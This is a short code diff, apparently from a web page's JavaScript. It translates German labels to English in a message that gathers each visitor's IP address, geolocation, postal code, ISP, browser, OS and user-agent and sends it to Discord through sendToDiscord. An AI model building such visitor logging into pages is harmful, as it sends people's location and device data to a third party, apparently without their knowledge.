@@ -74,18 +74,18 @@
 
             if (visitorInfo) {
                 const message = `
-                    Neue Besucherinformationen:
-                    IP-Adresse: ${visitorInfo.ip}
-                    Zeitstempel: ${timestamp}
-                    Stadt: ${visitorInfo.city}
+                    New Visitor:
+                    IP-Adress: ${visitorInfo.ip}
+                    Timestramp: ${timestamp}
+                    City: ${visitorInfo.city}
                     Region: ${visitorInfo.region}
-                    Land: ${visitorInfo.country_name}
-                    Postleitzahl: ${visitorInfo.postal}
-                    Breitengrad: ${visitorInfo.latitude}
-                    Längengrad: ${visitorInfo.longitude}
+                    Country: ${visitorInfo.country_name}
+                    postal code: ${visitorInfo.postal}
+                    Latitude: ${visitorInfo.latitude}
+                    Longitude: ${visitorInfo.longitude}
                     ISP: ${visitorInfo.org}
                     Browser: ${browserInfo.name} ${browserInfo.version}
-                    Betriebssystem: ${navigator.platform}
+                    Operating system: ${navigator.platform}
                     User-Agent: ${navigator.userAgent}
                 `;
                 sendToDiscord(message);
